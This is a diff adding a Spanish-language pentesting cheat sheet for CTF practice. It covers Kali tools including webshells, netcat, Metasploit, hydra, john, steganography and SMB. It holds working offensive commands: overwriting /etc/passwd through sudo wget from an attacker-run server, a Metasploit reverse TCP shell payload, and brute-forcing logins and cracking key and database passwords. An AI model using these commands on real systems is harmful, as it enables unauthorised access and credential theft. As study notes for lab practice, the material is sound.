@@ -1,0 +1,527 @@
+
+================================================
+
+	ÍNDICE DE PAQUETES Y PROTOCOLOS		
+
+================================================
+
+----------------------------------------------------------------------------------
+
+	"PHP"
+
+1. Kali tiene integrado 'webshells' en la ruta: 
+
+	/usr/share/webshells
+
+2. Siempre revisar los permisos en cuanto a scripts, el 'Hijacking' a través de shell personalizadas es muy útil.
+
+3. Si los scripts contienen la función/método 'require_once()' es muy útil, sobretodo cuando no contienen paths que provengan de la raíz del SO.
+
+	- require_once: Esta función es clave. Le dice a PHP: Busca este archivo externo y pega su contenido aquí antes de seguir'.
+
+----------------------------------------------------------------------------------
+
+	"Python"
+
+1. El comando correcto para abrir pequeños servidores es: 
+	
+	python3 -m http.server 80 → abre un servidor en el puerto 80, en el mismo path donde estemos ubicados
+
+2. Transformar de binarios a ascii:
+
+	echo '01010...' | python3 -c 'import sys; print(''.join(chr(int(b, 2)) for b in sys.stdin.read().split()))'
+
+3. Transformar de int a ascii:
+
+	echo '75 74 73 ...' | python3 -c 'import sys; print(''.join(chr(int(i)) for i in sys.stdin.read().split()))'
+
+4. Transformar URI chars:
+
+	python3 -c 'import urllib.parse; print(urllib.parse.unquote(<enter the input>))'
+
+----------------------------------------------------------------------------------
+
+	"Netcat" - "nc"
+
+1. Netcat como buen aliado sirve mucho para poner a la escucha los puertos con los flags:
+
+	-l: listen
+	-n: Númerico, no DNS
+	-v: verbose
+	-p: Número de puerto
+
+----------------------------------------------------------------------------------
+
+	"wget"
+
+1. Cuando se tienen privilegios de 'sudo' en una máquina para el comando wget una alternativa de superarlo es:
+
+	Reemplazar el archivo '/etc/passwd' con:
+
+	
+	- Abrir servidor con python
+
+	- Obtener con:
+
+		wget IP:PORT/file -O /etc/passwd
+
+---------------------------------------------------------------------------------
+
+	"curl"
+
+1. Comprobar formularios:
+
+	curl -s -X POST http://<IP>/ruta/ -d "user=admin&pass=wrongpassword"
+
+----------------------------------------------------------------------------------
+
+	"tshark"
+
+1. Cuando se tiene un archivo '.pcapng' es posible analizarlo con tshark o wireshark
+
+2. Algunos comandos para analizar son: 
+
+	# Resumen de protocolos usados
+	tshark -r archivo.pcapng -q -z io,phs
+
+	# Ver conversaciones/IPs
+	tshark -r archivo.pcapng -q -z conv,tcp
+
+	# Buscar credenciales en texto plano:
+	# HTTP
+	tshark -r archivo.pcapng -Y "http" -T fields -e http.request.uri -e http.file_data
+
+	# FTP/Telnet (credenciales en claro)
+	tshark -r archivo.pcapng -Y "ftp || telnet"
+	
+	# Reconstruye un stream TCP completo desde una captura.
+	tshark -r suspicious.pcapng -z follow,tcp,ascii,X -q
+
+		X: Número que puede ir ascendiendo hasta encontrar el módulo necesitado
+
+----------------------------------------------------------------------------------
+
+	"SSH" (Protocolo - Puerto 22)
+
+1. Ya sabemos cómo entrar por el puerto 22 del protocolo SSH, sin embargo también hay una alternativa estando dentro de la máquina:
+
+	ssh usuario@ip-de-la-máquina
+
+2. Para ingresar con una clave rsa:
+
+	ssh -i id_rsa user@IP
+
+3. Para crackear una clave RSA:
+
+	ssh2john file_rsa > rsa.hash
+
+	luego:
+
+	john --wordlist=/path/to/rockyou > rsa.cracked
+
+----------------------------------------------------------------------------------
+
+	"SCP" (SSH Files transfer)
+
+1. Comprobar que el servicio SSH esté activo:
+
+	sudo systemctl status ssh
+
+2. Si no está activo, activar:
+
+	sudo systemctl start ssh
+
+3. Se usa el comando scp:
+
+	scp [user@]host:[host-path] [my-path]
+
+	• De ser necesario: 
+
+	  - Usar "sudo"
+
+	  - Establecer puerto con -P
+
+4. Cerrar el servicio SSH:
+
+	sudo systemctl stop ssh
+
+5. Se pueden establecer parámetros:
+
+	scp -P <PORT> -o PreferredAuthentications=password [user@]host:[host-path] [my-path]
+
+	• -o: ssh options → permite establecer opciones
+
+		- PreferredAuthentications=password: Autenticación a través de passwd
+
+----------------------------------------------------------------------------------
+
+	"FTP" (Protocolo - Puerto 21)
+
+1. Para conectarse: 
+
+	ftp <IP> [PORT]
+
+2. Algunos comandos son: 
+
+	• ls / dir: Listar archivos/directorios
+
+	• get: Transferir archivos de la máquina remota a nuestra máquina (en el path de donde ejecutemos el protocolo)
+
+	• put: Transferir archivos de nuestra máquina a la máquina remota.
+
+----------------------------------------------------------------------------------
+
+	"GPG"
+
+1. GPG (GNU Privacy Guard) es una implementación libre del estándar OpenPGP. Permite cifrar y firmar datos para garantizar confidencialidad e integridad. Se usa ampliamente en comunicaciones seguras, verificación de software y CTFs.
+
+2. Tipos de archivos:
+
+	- '.asc': Clave GPG en formato texto (ASCII Armor). Puede ser clave pública, privada o ambas
+
+	- '.pgp': Datos cifrados con GPG (puede ser cualquier archivo cifrado)
+
+	- Ambos archivos deben ir en conjunto, están relacionados pero cumplen roles distintos:
+
+		• El '.asc' contiene la clave privada necesaria para descifrar
+
+		• El '.pgp' contiene los datos cifrados
+
+		• Sin la clave privada correcta, el .pgp es ilegible
+
+3. Proceso para descifrar:
+
+	1. Tener el .asc (clave privada)
+        	↓
+	2. Si tiene passphrase → crackearla con 'gpg2john + john'
+        	↓
+	3. Importar la clave → gpg --import archivo.asc
+        	↓
+	4. Descifrar → gpg --decrypt archivo.pgp
+        	↓
+	5. Obtener el contenido (credenciales, flags, etc.)
+
+----------------------------------------------------------------------------------
+
+	"Searchexploit"
+
+1. Es una herramienta de línea de comandos que te permite buscar en la base de datos de Exploit-DB de forma offline. Permite buscar exploits, PoCs y shellcodes para un servicio o software concreto sin necesidad de conexión a internet, ya que la base de datos está almacenada localmente en tu máquina.
+
+2. Uso básico:
+
+	searchsploit apache 2.4		# Buscar exploits para Apache 2.4
+
+	searchsploit -m 12345		# Copiar el exploit al directorio actual
+
+	searchsploit -x 12345		# Examinar el código del exploit
+
+	searchsploit --update		# Actualizar la base de datos local
+
+3. Flujo típico:
+
+	1. Identificar versiones con 'nmap'
+	2. Buscar en searchexploit con esa versión
+	3. Examinar con '-x' y copiar con '-m'
+	4. Adaptar y ejecutar
+
+----------------------------------------------------------------------------------
+
+	"Metasploit" - "msfconsole"
+
+1. Para que las búsquedas dentro de Metasploit sean rápidas, inicia la base de datos primero:
+
+	sudo msfdb init
+
+2. Luego lanzar el programa:
+
+	msfconsole
+
+3. Preparación del Entorno:
+
+	• Search - Buscar: 
+		
+		search type:[module] [keyword 1] [keyword 2]
+
+	• Load - Cargar: 
+		
+		use [script_path] (Encontrado con "search")
+
+4. Configuración del Objetivo (Target):
+
+	• Target IP - Port:
+
+		set RHOSTS [IP_objetivo]
+		set RPORT [PORT]
+
+	• Auth:
+		
+		set USERNAME [usuario_db]
+		set PASSWORD [clave_db]
+
+		set USER_FILE [/path/al/archivo] ← Sólo archivos con usuarios
+		set PASS_FILE [/path/al/archivo] ← Sólo archivos con contraseñas
+
+	• Verbose:
+
+		set VERBOSE true
+
+	• Controlar velocidad y conexiones:
+
+		set THREADS [Nro]
+		set CPUS [Nro]
+		set BATCH_SIZE [Nro]
+
+	• Persistence Fix: 
+
+		set TABLENAME [nombre_aleatorio] → (Útil para evitar el error de "table already exists").
+
+	• Stop on success:
+	
+		set STOP_ON_SUCCESS true
+
+5. Configuración del Túnel (Payload):
+
+	• Payload Select: 
+
+		set PAYLOAD linux/x64/shell_reverse_tcp
+
+	• Local IP: 
+
+		set LHOST [Tu_IP_VPN]
+
+	• Local Port: 
+
+		set LPORT [Puerto_escucha]
+
+6. Ejecución y Control
+
+	• Launch: run (o exploit)
+
+	• List Sessions: sessions -l
+
+	• Interact: sessions -i [ID_sesión]
+
+	• Background: CTRL+Z o background
+
+----------------------------------------------------------------------------------
+
+	"hexeditor"
+
+1. Sólamente hay que llamar hexdump con el archivo que se quiera modificar
+
+	hexeditor [file]
+
+----------------------------------------------------------------------------------
+
+	"xxd"
+
+1. El paquete 'xxd' tiene un flag que permite leer hasta cierta cantidad de bytes:
+
+	xxd -l NRO [file]
+
+----------------------------------------------------------------------------------
+
+	"xfreerdp"
+
+1. xfreerdp es la implementación por línea de comandos del protocolo RDP (Remote Desktop Protocol) más utilizada en sistemas basados en Linux (como Kali). Forma parte del proyecto FreeRDP. Permite el acceso remoto a entornos Windows desde máquinas Linux, emulando la experiencia de escritorio completa.
+
+2. Para conexiones sencillas:
+
+	• /u:(username)
+
+	• /p:(password)
+
+	• /v:(host-IP)
+
+	• /dynamic-resolution → (Resolución dinámica / se ajusta a nuestra pantalla)
+
+3. Si se desea más información ver el manpage o 'xfreerdp /help'
+
+---------------------------------------------------------------------------------
+
+	"Hydra"
+
+1. Es muy buen paquete para crackear 'logins'
+
+	hydra -L [users_file] -P [pass_file] <protocol>://IP:PORT
+
+2. Para hacer fuerza bruta en protocolo http con formulario: 
+
+	hydra -l|-L [User|users-file] -p|-P [pass|passwords-file] <IP> http-post-form '/ruta/:user=^USER^&pass=^PASS^:F=<Texto de fallo>'
+
+	- user: Depende del atributo 'name' del input de usuario
+
+	- pass: Depende del atributo 'name' del input de contraseña
+
+	- <Texto de fallo>: Texto que se debe poner cuando el formulario da fallos	
+
+---------------------------------------------------------------------------------
+
+	"tar"
+
+1. Para extraer el contenido de un archivo '.tar'
+
+	tar -xf archivo.tar
+
+---------------------------------------------------------------------------------
+
+	"unzip"
+
+1. El paquete unzip lista, prueba y extrae archivos comprimidos en ZIP
+
+2. Ver más en 'man unzip'
+
+3. Cuando un archivo (imagen o algún otro) contenga un .zip, y este a su vez solicite contraseña:
+
+	zip2john file.ext > file.hash
+
+	john --wordlist=.... file.hash
+
+---------------------------------------------------------------------------------
+
+	"steghide"
+
+1. Herramienta de esteganografía para esconder/revelar archivos ocultos
+
+2. Uso frecuente:
+
+	steghide info [archivo]
+
+	steghide extract -sf [archivo]
+
+	steghide extract [archivo] -p contraseña(si la requiere)
+
+	steghide -xf [archivo] → Este flag se utiliza para extraer cuando ya sabemos que hay dentro
+
+---------------------------------------------------------------------------------
+
+	"stegseek"
+
+1. Es un steghide cracker que se usa para extraer datos de archivos
+
+2. Uso frecuente:
+
+	stegseek -sf [archivo]
+
+	stegseek -sf [archivo] -wl [wordlist-path]
+
+	stegseek -xf [archivo] → Este flag es cuando ya sabemos qué hay dentro
+
+---------------------------------------------------------------------------------
+
+	"openssl"
+
+1. Cifrar alguna contraseña:
+
+	openssl passwd [password-a-cifrar]
+
+2. Para descifrar archivos cifrados con RSA sin tener la llave pública pero si la privada:
+
+	openssl pkeyutl -decrypt -inkey <private_key_file> -in <cipher_file>
+
+---------------------------------------------------------------------------------
+
+	"pspy"
+
+1. INVESTIGAR
+
+---------------------------------------------------------------------------------
+
+	"Servicio POP3"
+
+1. Al conectarse por 'nc':
+
+	nc <IP> <PORT>
+
+	USER [username]
+	PASS [password]
+
+2. Algunos comandos para investigar son: 
+
+	• STAT		Muestra el número de mensajes y el tamaño total.
+	• LIST		Lista los mensajes disponibles y su tamaño en bytes.
+	• RETR [n]	Recupera el contenido del mensaje número n.
+	• TOP [n] [m]	Muestra las primeras m líneas del mensaje n.
+	• DELE [n]	Marca el mensaje n para eliminación (se borra al salir).
+	• QUIT		Finaliza la sesión y aplica los cambios (borra mensajes marcados).
+
+---------------------------------------------------------------------------------
+
+	"KeePass":
+
+1. Se ha descargado la librería 'kpcli' que es un gestor de usuarios/contraseñas de código abierto
+2. Se usó la librería con el flag '--kdb' y nos hemos movido con comandos más o menos habituales: 'ls', 'cd' y 'show -p'
+3. Cuando se quiere extraer el contenido para abrir los archivos '.kdbx' se usa el comando:
+
+	keepass2john > archivo
+
+3. Para aplicar fuerza bruta usamos el john de siempre: 
+
+	john --wordlist=/ruta/a/rockyou.txt archivo-para-aplicar-fb
+
+----------------------------------------------------------------------------------
+
+	"Borg"
+
+1. El propósito de borg es proveer backups seguros y eficientes
+
+2. Sus comandos principales:
+
+	borg list /path/a/listar
+
+	borg info /path/para/información
+
+	borg extract /path/a/extraer/::archivo
+
+3. Más información: 
+
+	https://www.borgbackup.org/
+
+----------------------------------------------------------------------------------
+
+	"smbclient"
+
+1. El protocolo SMB es un protocolo de red que permite compartir archivos, impresoras, etcétera, entre nodos de una red de computadoras que usan el sistema operativo Microsoft Windows. Este protocolo pertenece a la capa de aplicación en el modelo TCP/IP.
+
+2. El 'servicename' es el nombre del servicio que se quiere usar en en el servidor, el servicio toma el nombre como '//server/service' donde:
+
+	- server: es el nombre de NetBIOS, nombre de servidor SMB/CIFS
+
+	- service: es el nombre del servicio ofrecido
+
+3. Comandos usados: 
+
+	smbclient -L //server -p <PORT> -N
+
+	• -L: Lista lo que hay en el servidor
+
+	• -p: Nro de puerto
+
+	• -N: No passwd
+
+	• smbclient //server/path -p <PORT> -N
+
+----------------------------------------------------------------------------------
+
+	"Windows":
+
+1. Para iniciar a aprender sobre vulneraciones en Windows repasar el contenido del reto:
+
+	https://medium.com/@haircutfish/tryhackme-investigating-windows-task-1-investigating-windows-da65f32cf67f
+
+	https://techwithz.com/posts/thm-investigatingwindows/
+
+---------------------------------------------------------------------------------
+
+	"RECOMENDACIONES"
+
+1. Siempre revisar los "cronjob" de las máquinas.
+
+2. El directorio "/opt" puede contener cosas útiles cuando se usan softwares de terceros.
+
+3. El directorio "/var" también puede contener información útil en cuanto a usarios.
+
+4. El directorio "/srv" siempre podría contener información útil en cuanto a servidores.
+
+5. La página "Cyberchef" es muy buena para desencriptados cuando se torna difícil.
+
